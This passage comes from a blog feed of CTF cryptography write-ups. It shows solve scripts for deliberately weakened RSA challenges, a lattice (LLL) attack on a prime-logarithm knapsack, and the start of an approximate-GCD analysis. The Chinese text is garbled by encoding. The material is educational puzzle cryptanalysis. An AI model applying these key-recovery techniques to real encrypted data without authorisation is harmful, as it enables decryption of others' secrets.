class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">c = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">high_p = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><span class="comment"># high bits of p without low zeros</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line">_p = high_p&lt;&lt;kbits</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = Zmod(n)[]</span><br><span class="line">f = x + _p</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits,beta=<span class="number">0.4</span>)</span><br><span class="line">p = _p+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">q = n // p</span><br><span class="line">d = <span class="built_in">int</span>(inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">msg3 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg2</span></span><br><span class="line">n = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">c1 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c2 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">e1 = <span class="number">17</span> </span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—æ±‚å‡ºs1 s2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EX_GCD</span>(<span class="params">a, b, arr, n=<span class="number">0</span></span>):</span>  <span class="comment"># æ‰©å±•æ¬§å‡ é‡Œå¾—</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[<span class="number">0</span>]</span><br><span class="line">    arr[<span class="number">0</span>] = arr[<span class="number">1</span>]</span><br><span class="line">    arr[<span class="number">1</span>] = t - <span class="built_in">int</span>(a / b) * arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> g  <span class="comment"># output: s * a + t * b = 1  g:æœ€å¤§å…¬å› æ•° arr[0] = s,  arr[1] = t</span></span><br><span class="line">arr = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">EX_GCD(e1, e2, arr)</span><br><span class="line">s1 = arr[<span class="number">0</span>]</span><br><span class="line">s2 = arr[<span class="number">1</span>]</span><br><span class="line">msg2 = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># msg1 </span></span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">msg1 = iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">msg = long_to_bytes(msg1) + long_to_bytes(msg2) + long_to_bytes(msg3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">print(md5.new(msg).hexdigest())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å›½èµ›åˆèµ›, ç¬¬ä¸€æ¬¡å‚åŠ å›½èµ›, é™¤äº†ç¬¬ä¸€é“æ¶å¿ƒçš„å¤å…¸, å…¶ä»–é¢˜ç›®è¿˜æ˜¯åšçš„æŒºæœ‰æ„æ€çš„&lt;br&gt;ä¸€å…±å…­é“é¢˜, å‡ºäº†å››é“é¢˜, å‰©ä¸‹ä¸€é“å¤å…¸(å‘•äº†), ä¸€é“AES&lt;br&gt;è¿˜å¯ä»¥å§, è®°å½•ä¸€ä¸‹, è™½ç„¶æœ‰äº›éƒ¨åˆ†ä»¥å‰åšè¿‡, ä½†è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿çš„&lt;/p&gt;
&lt;h1 id=&quot;0x00-classi</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
    <category term="AES" scheme="http://tearsjin.github.io/tags/AES/"/>
    
    <category term="PRNG" scheme="http://tearsjin.github.io/tags/PRNG/"/>
    
  </entry>
  
  <entry>
    <title>writeup-for-2021-redhat CTF</title>
    <link href="http://tearsjin.github.io/2021/05/16/writeup-for-2021-redhat-CTF/"/>
    <id>http://tearsjin.github.io/2021/05/16/writeup-for-2021-redhat-CTF/</id>
    <published>2021-05-16T02:49:52.000Z</published>
    <updated>2021-05-16T02:56:03.578Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§å®¶å¥½ï¼Œè¿™é‡Œk1rit0ï¼Œä»Šå¤©å¸¦å¤§å®¶äº†è§£çº¢å¸½æ¯Crypto wpã€‚åˆ°åº•æ˜¯æ€ä¹ˆä¸€å›äº‹å‘¢ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚</p><p>è¯´èµ·çº¢å¸½æ¯ï¼Œç›¸ä¿¡å¤§å®¶ä¸€å®šå¾ˆç†Ÿæ‚‰ï¼Œä½†Cryptoæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±è®©å°ç¼–å¸¦å¤§å®¶ä¸€èµ·äº†è§£å§</p><p>å…¶å®ï¼ŒCryptoå°±æ˜¯searchï¼Œå¤§å®¶å¯èƒ½ä¼šæƒŠè®¶ï¼ŒCryptoç«Ÿç„¶å°±æ˜¯searchï¼</p><p>è¿™å°±æ˜¯Crypto wpäº†ï¼Œä¸çŸ¥é“å¤§å®¶æœ‰ä»€ä¹ˆæƒ³æ³•å‘¢ï¼Ÿæ¬¢è¿åœ¨å±å¹•ä¸‹æ–¹ç•™è¨€å“¦<br><a href="https://pwnthem0le.polito.it/2020/12/20/hxpCTF-2020-Hyper-writeup/">https://pwnthem0le.polito.it/2020/12/20/hxpCTF-2020-Hyper-writeup/</a><br><a href="https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>XD</p><p>XD</p><p>XD</p><p>XD</p><blockquote><p>ç¬‘æ­»æ ¹æœ¬ç¬‘ä¸æ­», å…¨æ˜¯æœ‰åŸé¢˜, åšçš„å¿«è¿˜ä¸å¦‚åˆ«äººæœçš„å¿«, ä¸è¿‡ç¬¬äºŒé¢˜è¶…æ¤­åœ†æ›²çº¿è¿˜åœ¨çœ‹paper, ç°åœ¨è¿˜æ˜¯ä¸ä¼š(24é¡µ, çœ‹éƒ½çœ‹ä¸æ‡‚)</p><p>æ¸¸æˆä½“éªŒæå·®, åšå®Œé¢˜å°±åªèƒ½çœ‹ç€é˜Ÿå‹è¾“å‡º, é€†å‘çˆ·çˆ·å¼€å¿ƒåˆ°èµ·é£äº†</p><p>å°±æŠŠè‡ªå·±åšç¬¬ä¸€é¢˜çš„æ€è·¯å†™ä¸€ä¸‹å§</p></blockquote><h1 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]</span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span> <span class="comment">#è®¾ç½®æœ‰æ•ˆæ•°å­—</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line">print(ct)</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line">print(ct)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>ä¸€çœ‹åˆ°è¿˜ä»¥ä¸ºæ˜¯å°æ•°çš„èƒŒåŒ…é—®é¢˜, æ€ä¹ˆå¯èƒ½å˜›, çœ‹ä¸€ä¸‹å¼å­å°±èƒ½æ‡‚äº†<br>$$<br>ct = 2^{256}(k_0m_0 + k_1m_1 + k_2m_2 + \cdots k_{23}m_{23}) - e<br>$$<br>è¿™é‡Œå¤šäº†ä¸ª$-e$ å°±æ˜¯æŠŠå–æ•´ç›´æ¥çœ‹æˆå‡å»ä¸€ä¸ªå°æ•°$e$äº†</p><p>$k_n$æ˜¯å·²çŸ¥çš„, è€Œä¸”æ˜¯å°æ•°, ä¸èƒ½ç›´æ¥é€ æ ¼å­, ä½†æˆ‘ä»¬æŠŠ$2^{256}$åˆ†é…ç»™æ¯ä¸€é¡¹å°±ä¸ä¸€æ ·äº†, å¯¹äºå…¶ä¸­ä¸€é¡¹<br>$$<br>2^{256}km = 2^{256}\ln p \cdot m = (\lfloor 2^{256} \ln p \rceil - eâ€™)\cdot m<br>$$<br>è®°$\lfloor 2^{256} \ln p_i \rceil = A_i$æ¯ä¸€é¡¹éƒ½è¿™ä¹ˆå¹², é‚£ä¹ˆæ•´ä¸ª$ct$å°±ä¼šå˜æˆ<br>$$<br>\begin{align}<br>ct &amp;= A_0m_0 + A_1m_1 + \cdots + A_{23}m_{23} -(m_0e_0â€™+m_1e_1â€™+\cdots+m_{23}e_{23}â€™ + eâ€™â€™) \\<br>&amp; = A_0m_0 + A_1m_1 + \cdots + A_{23}m_{23} -E<br>\end{align}<br>$$<br>å…¶ä¸­ç³»æ•°$A$éƒ½æ˜¯ç‰¹åˆ«å¤§çš„æ•°, è€Œ$m,E$éƒ½éå¸¸å°, è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ç”¨èƒŒåŒ…é—®é¢˜çš„è§£æ³•æ±‚å‡º$m$</p><p>æ„é€ æ ¼å­<br>$$<br>\begin{pmatrix}<br>1 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; A_0 \\<br>0 &amp; 1 &amp; 0 &amp; \cdots &amp; 0 &amp; A_1 \\<br>0 &amp; 0 &amp; 1 &amp; \cdots &amp; 0 &amp; A_2 \\<br>\vdots &amp;\vdots &amp;\vdots &amp;\ddots&amp;\vdots&amp;\vdots \\<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 1 &amp; A_{23} \\<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; -ct<br>\end{pmatrix}<br>$$<br>è§„çº¦å°±èƒ½å¾—åˆ°$(m_0,m_1,\cdots,m_{23},E)$äº†</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys.append(math.floor(Decimal(primes[i]).ln()*<span class="number">2</span>**<span class="number">256</span>))</span><br><span class="line">c1 = <span class="number">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line">c2 = <span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br><span class="line"></span><br><span class="line">L = matrix([[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">25</span>)])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    L[i,-<span class="number">1</span>] = keys[i]</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = -c1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L.LLL()[<span class="number">0</span>][:-<span class="number">1</span>]:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = -c2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L.LLL()[<span class="number">0</span>][:-<span class="number">1</span>]:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤§å®¶å¥½ï¼Œè¿™é‡Œk1rit0ï¼Œä»Šå¤©å¸¦å¤§å®¶äº†è§£çº¢å¸½æ¯Crypto wpã€‚åˆ°åº•æ˜¯æ€ä¹ˆä¸€å›äº‹å‘¢ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚&lt;/p&gt;
&lt;p&gt;è¯´èµ·çº¢å¸½æ¯ï¼Œç›¸ä¿¡å¤§å®¶ä¸€å®šå¾ˆç†Ÿæ‚‰ï¼Œä½†Cryptoæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±è®©å°ç¼–å¸¦å¤§å®¶ä¸€èµ·äº†è§£å§&lt;/p&gt;
&lt;p&gt;å…¶å®ï¼ŒCryptoå°±æ˜¯searchï¼Œå¤§å®¶å¯èƒ½ä¼šæƒŠè®¶ï¼ŒCr</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021 MRCTF</title>
    <link href="http://tearsjin.github.io/2021/04/17/writeup-for-2021-MRCTF/"/>
    <id>http://tearsjin.github.io/2021/04/17/writeup-for-2021-MRCTF/</id>
    <published>2021-04-17T11:21:47.000Z</published>
    <updated>2021-04-17T11:57:39.585Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å•Šæ¯”èµ›çš„æ—¶å€™åˆšå¥½å’Œnpyå‡ºå»ç©äº†, ä¹Ÿæ²¡æ€ä¹ˆçœ‹é¢˜, å°±çœ‹äº†åŠä¸ªä¸‹åˆçš„Common prime rsa. ä¹Ÿæ²¡æ•´å‡ºæ¥.<br>æœ€è¿‘åˆåœ¨å¿™å­¦æ ¡çš„HW<del>å°±æ˜¯ä»€ä¹ˆæˆæœéƒ½æ²¡, åªèƒ½çœ‹ç€å¤§ä½¬å¹²è‡ªå·±åˆ’æ°´çš„é‚£ç§</del>. æ‰€ä»¥é¢˜ç›®å¤ç°ä»€ä¹ˆçš„å°±æ…¢äº†å¥½å¤š.<br>æ…¢æ…¢çš„æ›´æ–°å®Œå§, æ¯æ¬¡åšé¢˜éƒ½ä¸€å †paper, æƒ³æ…¢æ…¢çš„çœ‹å®Œåªèƒ½èŠ±å¤šç‚¹æ—¶é—´äº†å§</p></blockquote><h1 id="Strange-GCD"><a href="#Strange-GCD" class="headerlink" title="Strange_GCD"></a>Strange_GCD</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">P_bits = <span class="number">444</span></span><br><span class="line">Q_bits = <span class="number">666</span></span><br><span class="line">R_bits = <span class="number">333</span></span><br><span class="line">key_num = <span class="number">9</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    could_not_solve = <span class="literal">False</span></span><br><span class="line">    p = getPrime(P_bits)</span><br><span class="line">    <span class="keyword">if</span> gcd(p-<span class="number">1</span>, e) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    R = []</span><br><span class="line">    Q = []</span><br><span class="line">    N = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_num):</span><br><span class="line">        Q.append(getPrime(Q_bits))</span><br><span class="line">        R.append(getrandbits(R_bits))</span><br><span class="line">        N.append(p * Q[-<span class="number">1</span>] + R[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> gcd(Q[-<span class="number">1</span>], e) != <span class="number">1</span>:</span><br><span class="line">            could_not_solve = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> could_not_solve:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">45</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_num):</span><br><span class="line">    tmp_cipher = flag[i*<span class="built_in">len</span>(flag)//key_num:(i+<span class="number">1</span>)*<span class="built_in">len</span>(flag)//key_num].encode()</span><br><span class="line">    tmp_cipher = urandom(<span class="number">128</span> - <span class="built_in">len</span>(tmp_cipher)) + tmp_cipher</span><br><span class="line">    tmp_cipher = <span class="built_in">pow</span>(bytes_to_long(tmp_cipher), e, p * Q[i])</span><br><span class="line">    C.append(tmp_cipher)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line">print(<span class="string">&#x27;C =&#x27;</span>, C)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = [...]</span></span><br><span class="line"><span class="string">C = [...]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>è¿™é¢˜æ¯”å®Œèµ›ä»¥ååšçš„, paperä¹Ÿæ˜¯ç›´æ¥å°±çœ‹åˆ«äººæ‰¾äº†<del>è‡ªå·±æ‰¾å¤ªæµªè´¹æ—¶é—´å•¦</del></p><p>åšçš„æ—¶å€™æ²¡çœ‹paper, é€ æ ¼å­æ²¡å»æ€è€ƒæ€ä¹ˆæ¶ˆå»æ¯”è¾ƒå¤§çš„é¡¹, çœ‹äº†paperæ‰æ˜ç™½, </p><h3 id="AGCD"><a href="#AGCD" class="headerlink" title="AGCD"></a>AGCD</h3><p>å…ˆæ¥çœ‹çœ‹è¿™è¾¹çš„å…¬é’¥ç”Ÿæˆ, è¿™å…±ç”Ÿæˆäº†9ä¸ª$N_i = p \cdot q_i + r_i,i=0,1,â€¦,8$<br>å…¶ä¸­$p,q,r$çš„ä½æ•°åˆ†åˆ«ä¸º$444,666,333$, è¿™ä¸ªé—®é¢˜çœ‹ç€åƒLWEä½†æ˜¯æˆ‘ä»¬åªçŸ¥é“$N_i$. å°è¯•äº†ä¸€ä¸‹é€ æ ¼å­ä¹Ÿæ²¡å•¥ç»“æœ, æ‰¾paperæ‰¾åˆ°äº†è¿™ä¸ª-&gt; <a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">The Approximate GCD Problem</a> è¿™é‡Œé¢æä¾›äº†ä¸€ä¸ªé€ æ ¼å­çš„æ–¹æ³•æ¥åˆ†è§£$N_i$</p><blockquote><p>å…¶å®è¿™é‡Œé¢å°±æœ‰ä¸€ç§é€ æ ¼å­çš„æ€æƒ³å§? æˆ‘ä»¬æƒ³è¦é€šè¿‡æ ¼åŸºè§„çº¦å¾—å‡ºç»“æœ, é‚£ä¹ˆæˆ‘ä»¬å¿…é¡»ä¿è¯æˆ‘ä»¬éœ€è¦æ±‚å‡ºçš„é‡ä¸ä¼šå¾ˆå¤§(åªæœ‰è¿™æ ·æ‰èƒ½ä½¿å¾—æˆ‘ä»¬è¦æ±‚çš„å‘é‡æ˜¯æœ€çŸ­å‘é‡), æ‰€ä»¥æˆ‘ä»¬çš„ä¸€ä¸ªæ€è·¯, å¯ä»¥æ˜¯æ¶ˆå»ä¸€äº›æ¯”è¾ƒå¤§çš„æ•°, ç•™ä¸‹ä¸€äº›æ¯”è¾ƒå°çš„.</p></blockquote><p>åœ¨è¿™é‡Œæˆ‘ä»¬å…ˆæ‹¿ä¸¤è¡Œç­‰å¼æ¥åˆ†æ<br>$$<br>N_0 = p \cdot q_0 + r_0 \\<br>N_1 = p \cdot q_1 + r_1<br>$$<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼å­é‡Œæœ‰ä¸ªéå¸¸å¤§çš„$p,q$, å¯ä»¥æƒ³ä¸ªåŠæ³•æ¶ˆå»è¿™ä¸ªå¤§çš„é¡¹å¹¶ä¸”ä¸å¼•å…¥æ¯”ä»–æ›´å¤§çš„é¡¹. ä¸€ä¸ªåŠæ³•å°±æ˜¯é€šè¿‡å‡æ³•!<br>$$<br>N_1q_0 - N_0q_1 = r_1q_0 - r_0q_1 \tag 1<br>$$<br>é€šè¿‡å‡æ³•å¯ä»¥å°†$1110 $ bitsçš„$pq$å˜æˆäº†å°ä¸€ç‚¹çš„$999$ bits çš„$r_1q_0 - r_0q_1$, è¿™é‡Œå°äº†ç‚¹å°±å¯ä»¥å°è¯•åšæ–‡ç« äº†. æˆ‘ä»¬å¯ä»¥æ 